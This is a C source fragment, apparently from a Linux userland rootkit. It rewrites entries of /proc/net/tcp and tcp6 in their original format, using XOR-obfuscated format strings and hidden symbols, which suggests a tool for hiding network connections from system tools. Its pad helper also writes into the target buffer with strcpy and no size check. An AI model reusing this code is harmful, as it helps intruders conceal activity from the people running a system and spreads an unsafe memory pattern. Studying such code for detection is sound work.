/* insert src into target, at position c. */
void pad(char *target, const char *src, const int c){
    char buf[strlen(target)+strlen(src)+1];
    size_t len;

    memset(buf, 0, sizeof(buf));
    strncpy(buf, target, c);
    len = strlen(buf);
    strcpy(buf+len, src);

    len += strlen(src);
    strcpy(buf+len, target+c);
    strcpy(target, buf);
}

/* returns target num as hexadecimal, of length len - padding the result if necessary. */
char *hexnum(int num, const size_t len){
    u_int i = 0, x = 0, rem;
    char tmp[len+1], buf[len+1];

    memset(tmp, 0, sizeof(tmp));
    while(num != 0){
        rem = num % 16;
        tmp[i++] = rem < 10 ? 48 + rem : 55 + rem;
        num /= 16;
    }

    memset(buf, 0, sizeof(buf));
    for(int j = i-1; j >= 0 && x < sizeof(buf); j--)
        buf[x++] = tmp[j];
    buf[x] = '\0';

    size_t buflen = strlen(buf);
    while(buflen < len){
        pad(buf, "0", 0);
        ++buflen;
    }

    return strdup(buf);
}

void __attribute((visibility("hidden"))) freenums(char **nums[], const size_t n){
    for(size_t s=0; s<n; s++)
        clean(*nums[s]);
}

/* prints everything stored in target procnet_t, to the stream associated with outfp.
 * 1 is returned on success. -1 on error. */
int procnetprint(const char *path, const procnet_t pn, FILE *outfp){
    // ac = actual contents
    /* for each of these values, get the hexadecimal equivalent for representation in the final print, to mimic ac.
     * take into consideration the max length (from numsizes) for the hexadecimal as it would be in ac. 'unused' bytes in
     * the result for the current hexadecimal are padded with zeros from left to right in accordance with ac. */
    const int numgets[8]  = {pn.rport, pn.lport, pn.state, pn.txq,
                             pn.rxq,   pn.t_run, pn.t_len, pn.retr},
              numsizes[8] = {4, 4, 2, 8, 8, 2, 8, 8};
    const size_t ncount = sizeofarr(numgets);

    /* hexlify all target values. */
    char *rport, *lport, *hexstate, *txq, *rxq, *trun, *tlen, *retr;
    char **targets[] = {&rport, &lport, &hexstate, &txq, &rxq, &trun, &tlen, &retr};
    for(size_t i = 0; i < ncount; i++){
        *targets[i] = hexnum(numgets[i], numsizes[i]);
        if(!*targets[i]){
            if(i > 0)
                freenums(targets, i);
            return -1;
        }
    }

    /* determine what format string we need. depending on if path is /proc/net/tcp or tcp6. */
    char *pnetpath = xordup(PNET6_PATH);
    if(!pnetpath){
        freenums(targets, ncount);
        return -1;
    }
    int ss = strcmp(pnetpath, path);
    clean(pnetpath);
    char *fmt = ss == 0 ? xordup(OG_PNET6_FMT) : xordup(OG_PNET_FMT);
    if(!fmt){
        freenums(targets, ncount);
        return -1;
    }

    char lbuf[strlen(pn.laddr)+strlen(lport)+2], rbuf[strlen(pn.raddr)+strlen(rport)+2];
    snprintf(lbuf, sizeof(lbuf), "%s:%s", pn.laddr, lport);
    snprintf(rbuf, sizeof(rbuf), "%s:%s", pn.raddr, rport);
    fprintf(outfp, fmt, pn.d,  lbuf,   rbuf,    hexstate,
                        txq,   rxq,    trun,    tlen,
                        retr,  pn.uid, pn.tout, pn.inode,
                        pn.etc);
    fflush(outfp);

    clean(fmt);
    freenums(targets, ncount);
    return 1;
}